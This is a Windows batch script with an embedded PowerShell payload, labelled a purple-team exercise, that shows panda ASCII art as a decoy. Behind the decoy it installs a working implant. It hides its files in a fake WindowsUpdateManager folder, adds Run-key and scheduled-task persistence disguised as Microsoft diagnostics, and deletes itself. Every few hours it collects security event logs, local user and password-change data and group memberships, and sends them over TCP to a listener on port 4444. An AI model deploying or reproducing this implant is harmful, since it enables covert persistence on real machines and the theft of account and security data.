@echo off
setlocal enabledelayedexpansion

:: ============================================================
::  PANDA DEPLOY  -  Purple Team Training Exercise
::  Single-file deployment. Only use on authorized systems.
:: ============================================================

set DEPLOY_DIR=C:\ProgramData\WindowsUpdateManager\DiagCache
set DEPLOY_ROOT=C:\ProgramData\WindowsUpdateManager
set PS1_NAME=diagtrack_runner.ps1
set VBS_NAME=diagtrack_host.vbs
set TASK_NAME=MicrosoftDiagnosticsHost
set REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run
set REG_VAL=DiagnosticsHost

echo.
echo [1/6] Creating deployment directory...
mkdir "%DEPLOY_DIR%" 2>nul
if not exist "%DEPLOY_DIR%" (
    echo [FAIL] Could not create directory. Try running as administrator.
    pause & exit /b 1
)
echo [ OK ] %DEPLOY_DIR%

echo.
echo [2/6] Writing VBS launcher...
(
    echo CreateObject^("WScript.Shell"^).Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%DEPLOY_DIR%\%PS1_NAME%""", 0, False
) > "%DEPLOY_DIR%\%VBS_NAME%"
if not exist "%DEPLOY_DIR%\%VBS_NAME%" (
    echo [FAIL] VBS write failed.
    pause & exit /b 1
)
echo [ OK ] %VBS_NAME%

echo.
echo [3/6] Writing PowerShell payload...
more +74 "%~f0" | powershell -NoProfile -ExecutionPolicy Bypass -Command "$input | Set-Content '%DEPLOY_DIR%\%PS1_NAME%' -Encoding UTF8"

if not exist "%DEPLOY_DIR%\%PS1_NAME%" (
    echo [FAIL] PS1 write failed.
    pause & exit /b 1
)
echo [ OK ] %PS1_NAME%

echo.
echo [4/6] Hiding deployment directory...
attrib +h +s "%DEPLOY_DIR%"
attrib +h +s "%DEPLOY_ROOT%"
echo [ OK ] Attributes set.

echo.
echo [5/6] Installing persistence...
reg add "%REG_KEY%" /v "%REG_VAL%" /t REG_SZ /d "wscript.exe \"%DEPLOY_DIR%\%VBS_NAME%\"" /f >nul 2>&1
reg query "%REG_KEY%" /v "%REG_VAL%" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (echo [FAIL] Registry key not set.) else (echo [ OK ] Registry run key installed.)

schtasks /create /tn "%TASK_NAME%" /tr "wscript.exe \"%DEPLOY_DIR%\%VBS_NAME%\"" /sc onlogon /rl highest /f >nul 2>&1
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %ERRORLEVEL% NEQ 0 (echo [FAIL] Scheduled task not created.) else (echo [ OK ] Scheduled task installed.)

echo.
echo [6/6] Launching payload...
wscript.exe "%DEPLOY_DIR%\%VBS_NAME%"
echo [ OK ] Launched. A panda will appear shortly as proof-of-life.
echo        Subsequent pandas arrive every 2-3 hours.
echo.
echo Deployment complete. Press any key to self-delete.
pause >nul
(goto) 2>nul & del "%~f0"
goto :EOF

::PS1_CONTENT_BELOW_THIS_LINE
$pandas = @(
@"
                                                             -|-_
                                                              | _

                                                             <|/\
                                                              | |,

                                                             |-|-o
                                                             |<|.

                                              _,..._,m,      |,
                                           ,/'      '"";     | |,
                                          /             ".
                                        ,'mmmMMMMmm.      \  -|-_"
                                      _/-"^^^^^"""%#%mm,   ;  | _ o
                                ,m,_,'              "###)  ;,
                               (###%                 \#/  ;##mm.
                                ^#/  __        ___    ;  (######)
                                 ;  //.\\     //.\\   ;   \####/
                                _; (#\"//     \\"/#)  ;  ,/
                               @##\ \##/   =   `"=" ,;mm/
                               `\##>.____,...,____,<####@
                                                     ""'                 
"@,
@"
                              _,add8ba,
                            ,d888888888b,
                           d8888888888888b                        _,ad8ba,_
                          d888888888888888)                     ,d888888888b,
                          I8888888888888888 _________          ,8888888888888b
                __________`Y88888888888888P"""""""""""baaa,__ ,888888888888888,
            ,adP"""""""""""9888888888P""^                 ^""Y8888888888888888I
         ,a8"^           ,d888P"888P^                           ^"Y8888888888P'
       ,a8^            ,d8888'                                     ^Y8888888P'
      a88'           ,d8888P'                                        I88P"^
    ,d88'           d88888P'                                          "b,
   ,d88'           d888888'                                            `b,
  ,d88'           d888888I                                              `b,
  d88I           ,8888888'            ___                                `b,
 ,888'           d8888888          ,d88888b,              ____            `b,
 d888           ,8888888I         d88888888b,           ,d8888b,           `b
,8888           I8888888I        d8888888888I          ,88888888b           8,
I8888           88888888b       d88888888888'          8888888888b          8I
d8886           888888888       Y888888888P'           Y8888888888,        ,8b
88888b          I88888888b      `Y8888888^             `Y888888888I        d88,
Y88888b         `888888888b,      `""""^                `Y8888888P'       d888I
`888888b         88888888888b,                           `Y8888P^        d88888
 Y888888b       ,8888888888888ba,_          _______        `""^        ,d888888
 I8888888b,    ,888888888888888888ba,_     d88888888b               ,ad8888888I
 `888888888b,  I8888888888888888888888b,    ^"Y888P"^      ____.,ad88888888888I
  88888888888b,`888888888888888888888888b,     ""      ad888888888888888888888'
  8888888888888698888888888888888888888888b_,ad88ba,_,d88888888888888888888888
  88888888888888888888888888888888888888888b,`"""^ d8888888888888888888888888I
  8888888888888888888888888888888888888888888baaad888888888888888888888888888'
  Y8888888888888888888888888888888888888888888888888888888888888888888888888P
  I888888888888888888888888888888888888888888888P^  ^Y8888888888888888888888'
  `Y88888888888888888P88888888888888888888888888'     ^88888888888888888888I
   `Y8888888888888888 `8888888888888888888888888       8888888888888888888P'
    `Y888888888888888  `888888888888888888888888,     ,888888888888888888P'
     `Y88888888888888b  `88888888888888888888888I     I888888888888888888'
       "Y8888888888888b  `8888888888888888888888I     I88888888888888888'
         "Y88888888888P   `888888888888888888888b     d8888888888888888'
            ^""""""""^     `Y88888888888888888888,    888888888888888P'
                             "8888888888888888888b,   Y888888888888P^
                              `Y888888888888888888b   `Y8888888P"^
                                "Y8888888888888888P     `""""^
                                  `"YY88888888888P'
                                       ^""""""""'        
"@,
@"
          ## 
   ###----## 
   ###      \
   /        ##__
  /       ##   #     --#  
 :           __/   -#   :  
,'          _\     >     : 
####      :'     #########:   
##########          |  ###:   
######################    :
#######################   :
######################...,'
            :
             ;
              ;
               ;
              ,;
           ;##########
          ;###########
,,,,,,,,,;########### 
"@
)

$pandaNames = @(
    "Bao Bao","Mei Xiang","Tian Tian","Bei Bei","Xiao Qi Ji",
    "Buttercup","Dumpling","Wonton","Mr. Fluffybottom",
    "Professor Bamboo","Noodle","Mochi","Pudding","Lord Bambington"
)

$pandaFacts = @(
    "Giant pandas spend 10-16 hours a day eating bamboo.",
    "A pandas thumb is actually an enlarged wrist bone.",
    "Newborn pandas are roughly the size of a stick of butter.",
    "A group of pandas is called an embarrassment.",
    "Pandas can swim and are surprisingly good at it.",
    "Wild giant pandas are only found in central China.",
    "Pandas have been on Earth for 2-3 million years.",
    "Pandas in captivity can live to over 30 years old.",
    "Pandas eat up to 84 lbs of bamboo per day.",
    "Baby pandas are born pink and tiny - about 4 oz.",
    "Pandas have 5 fingers plus a pseudo-thumb for gripping bamboo.",
    "Pandas rarely sleep in the same spot twice in the wild.",
    "Red pandas are not closely related to giant pandas at all."
)

$niceColors = @("White","Cyan","Green","Yellow","Magenta","Gray")

$pandaSizes = $pandas | ForEach-Object {
    $lines    = $_ -split "`n"
    $maxWidth = ($lines | Measure-Object -Property Length -Maximum).Maximum
    $height   = $lines.Count
    [PSCustomObject]@{ Art = $_; Width = $maxWidth; Height = $height }
}

Add-Type -AssemblyName System.Windows.Forms

function Spawn-Panda {
    $chosen = $pandaSizes | Get-Random
    $name   = $pandaNames | Get-Random
    $fact   = $pandaFacts | Get-Random
    $color  = $niceColors | Get-Random

    $bufCols = $chosen.Width  + 4
    $bufRows = $chosen.Height + 6
    $pixelW  = $bufCols * 8  + 18
    $pixelH  = $bufRows * 17 + 40

    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
    $randX  = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Width  - $pixelW))
    $randY  = Get-Random -Minimum 0 -Maximum ([Math]::Max(1, $screen.Height - $pixelH))

    $env:PANDA_ART     = $chosen.Art
    $env:PANDA_NAME    = $name
    $env:PANDA_FACT    = $fact
    $env:PANDA_COLOR   = $color
    $env:PANDA_BUFCOLS = "$bufCols"
    $env:PANDA_BUFROWS = "$bufRows"
    $env:PANDA_PIXELW  = "$pixelW"
    $env:PANDA_PIXELH  = "$pixelH"
    $env:PANDA_X       = "$randX"
    $env:PANDA_Y       = "$randY"

    $child = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h, IntPtr i, int x, int y, int cx, int cy, uint f);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool SetWindowText(IntPtr h, string s);
}
"@ -Language CSharp
$art     = $env:PANDA_ART
$name    = $env:PANDA_NAME
$fact    = $env:PANDA_FACT
$color   = $env:PANDA_COLOR
$bufCols = [int]$env:PANDA_BUFCOLS
$bufRows = [int]$env:PANDA_BUFROWS
$pixelW  = [int]$env:PANDA_PIXELW
$pixelH  = [int]$env:PANDA_PIXELH
$x       = [int]$env:PANDA_X
$y       = [int]$env:PANDA_Y
$minSize = New-Object System.Management.Automation.Host.Size(1, 1)
$Host.UI.RawUI.WindowSize  = $minSize
$Host.UI.RawUI.BufferSize  = New-Object System.Management.Automation.Host.Size($bufCols, ($bufRows + 50))
$Host.UI.RawUI.WindowSize  = New-Object System.Management.Automation.Host.Size($bufCols, $bufRows)
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = $color
[Console]::CursorVisible = $false
Clear-Host
$hwnd = [WinApi]::GetConsoleWindow()
[WinApi]::SetWindowText($hwnd, $name) | Out-Null
Start-Sleep -Milliseconds 200
[WinApi]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, $pixelW, $pixelH, 0x0044) | Out-Null
Write-Host $art
Write-Host ("-" * ($bufCols - 2))
Write-Host "  My name is $name"
Write-Host ""
Write-Host "  Did you know, $fact"
Start-Sleep 12
'@
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($child))
    Start-Process powershell -ArgumentList "-NoExit -EncodedCommand $enc"
}
# ── Exfil configuration ────────────────────────────────────────
$ExfilHost = "192.168.1.100"   # <-- set to your listener IP
$ExfilPort = 4444
$LogDir    = "$env:ProgramData\WindowsUpdateManager\DiagCache\.logs"
$PandaLog  = "$env:ProgramData\WindowsUpdateManager\DiagCache\.panda.log"

# ── Collect security-relevant Windows event logs ───────────────
function Collect-Logs {
    param([int]$HoursBack = 3)

    $since   = (Get-Date).AddHours(-$HoursBack)
    $ts      = Get-Date -Format 'yyyyMMdd_HHmmss'
    $outFile = "$LogDir\logs_$ts.txt"
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null

    $sb = [System.Text.StringBuilder]::new()
    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine(" PANDA LOG EXFIL - $env:COMPUTERNAME - $(Get-Date)")
    $null = $sb.AppendLine(" Window  : last $HoursBack hours")
    $null = $sb.AppendLine(" Context : $env:USERDOMAIN\$env:USERNAME")
    $null = $sb.AppendLine("============================================================")
    $null = $sb.AppendLine("")

    # Security event log - requires admin
    # If access denied, these sections will say so clearly
    $secSections = [ordered]@{
        "PASSWORD CHANGES"               = @(4723, 4724)
        "USER CREATION"                  = @(4720, 4722)
        "USER DELETION"                  = @(4726, 4725)
        "PERMISSION / PRIVILEGE CHANGES" = @(4738, 4781, 4672, 4648, 4732, 4733, 4728, 4729)
    }
    foreach ($section in $secSections.Keys) {
        $null = $sb.AppendLine("=== $section ===")
        try {
            $evts = Get-WinEvent -FilterHashtable @{
                LogName   = 'Security'
                Id        = $secSections[$section]
                StartTime = $since
            } -ErrorAction SilentlyContinue
            if ($evts) {
                foreach ($e in $evts) {
                    $null = $sb.AppendLine("[$($e.TimeCreated)] ID:$($e.Id) - $($e.Message -replace '\s+', ' ')")
                }
            } else {
                $null = $sb.AppendLine("(no events)")
            }
        } catch {
            $null = $sb.AppendLine("(Security log access denied - payload needs admin for this section)")
        }
        $null = $sb.AppendLine("")
    }

    # PasswordLastSet via Get-LocalUser - readable without admin
    # Comparing this across dumps reveals password changes even without Security log access
    $null = $sb.AppendLine("=== LOCAL USER SNAPSHOT (Get-LocalUser) ===")
    $null = $sb.AppendLine("(compare PasswordLastSet across dumps to detect password changes)")
    try {
        Get-LocalUser | ForEach-Object {
            $null = $sb.AppendLine("$($_.Name) | Enabled:$($_.Enabled) | LastLogon:$($_.LastLogon) | PwdLastSet:$($_.PasswordLastSet)")
        }
    } catch { $null = $sb.AppendLine("(unavailable)") }
    $null = $sb.AppendLine("")

    # net user - also readable without admin, gives password age
    $null = $sb.AppendLine("=== LOCAL USER SNAPSHOT (net user) ===")
    try {
        $userlist = @()
        & net user 2>&1 | ForEach-Object {
            if ($_ -match '^\-+$' -or $_ -match 'completed' -or $_ -match 'User accounts') { return }
            $_ -split '\s{2,}' | Where-Object { $_.Trim() } | ForEach-Object { $userlist += $_.Trim() }
        }
        foreach ($u in $userlist) {
            $detail = (& net user $u 2>&1) -join "`n"
            $pwline  = ($detail -split "`n" | Where-Object { $_ -match 'Password last set' }) -join ''
            $lastlog = ($detail -split "`n" | Where-Object { $_ -match 'Last logon' })        -join ''
            $acct    = ($detail -split "`n" | Where-Object { $_ -match 'Account active' })    -join ''
            $null = $sb.AppendLine("$u | $($acct.Trim()) | $($pwline.Trim()) | $($lastlog.Trim())")
        }
    } catch { $null = $sb.AppendLine("(unavailable)") }
    $null = $sb.AppendLine("")

    # Local group membership - readable without admin
    $null = $sb.AppendLine("=== LOCAL GROUP SNAPSHOT ===")
    try {
        Get-LocalGroup | ForEach-Object {
            $members = (Get-LocalGroupMember $_.Name -ErrorAction SilentlyContinue |
                        Select-Object -ExpandProperty Name) -join ', '
            $null = $sb.AppendLine("$($_.Name): $members")
        }
    } catch { $null = $sb.AppendLine("(unavailable)") }
    $null = $sb.AppendLine("")

    $null = $sb.AppendLine("=== END OF REPORT ===")
    [System.IO.File]::WriteAllText($outFile, $sb.ToString())
    return $outFile
}

# ── Exfiltrate via HTTP POST to netcat listener ────────────────
function Send-Logs {
    param([string]$LogFile)
    if (-not (Test-Path $LogFile)) { return }

    $body     = [System.IO.File]::ReadAllBytes($LogFile)
    $filename = [System.IO.Path]::GetFileName($LogFile)
    $ts       = Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ'

    try {
        $tcp    = [System.Net.Sockets.TcpClient]::new($ExfilHost, $ExfilPort)
        $stream = $tcp.GetStream()
        $writer = [System.IO.StreamWriter]::new($stream)
        $writer.AutoFlush = $true

        $writer.Write("POST /logs HTTP/1.1`r`n")
        $writer.Write("Host: ${ExfilHost}:${ExfilPort}`r`n")
        $writer.Write("Content-Type: text/plain`r`n")
        $writer.Write("Content-Length: $($body.Length)`r`n")
        $writer.Write("X-Hostname: $env:COMPUTERNAME`r`n")
        $writer.Write("X-Timestamp: $ts`r`n")
        $writer.Write("X-Filename: $filename`r`n")
        $writer.Write("`r`n")
        $writer.Flush()
        $stream.Write($body, 0, $body.Length)
        $stream.Flush()
        Start-Sleep -Milliseconds 500
        $tcp.Close()

        Add-Content -Path $PandaLog -Value "$(Get-Date): exfil OK  $filename -> ${ExfilHost}:${ExfilPort}"
        Remove-Item -Path $LogFile -Force -ErrorAction SilentlyContinue
    } catch {
        Add-Content -Path $PandaLog -Value "$(Get-Date): exfil FAIL $filename - $_"
    }
}

# ── Proof-of-life: spawn one panda + baseline log collection ───
Spawn-Panda
Start-Sleep -Seconds 2

Add-Content -Path $PandaLog -Value "$(Get-Date): startup"
Send-Logs (Collect-Logs -HoursBack 24)

# ── Main loop: panda + exfil every 2-3 hours ───────────────────
while ($true) {
    $sleep = Get-Random -Minimum 7200 -Maximum 10800
    Start-Sleep -Seconds $sleep

    $liveCount = (Get-Process powershell -ErrorAction SilentlyContinue |
        Where-Object { $_.MainWindowTitle -ne "" -and
                       $_.MainWindowTitle -notmatch "diagtrack|WindowsUpdate" }).Count

    if ($liveCount -lt 25) { Spawn-Panda }

    Send-Logs (Collect-Logs -HoursBack 3)
}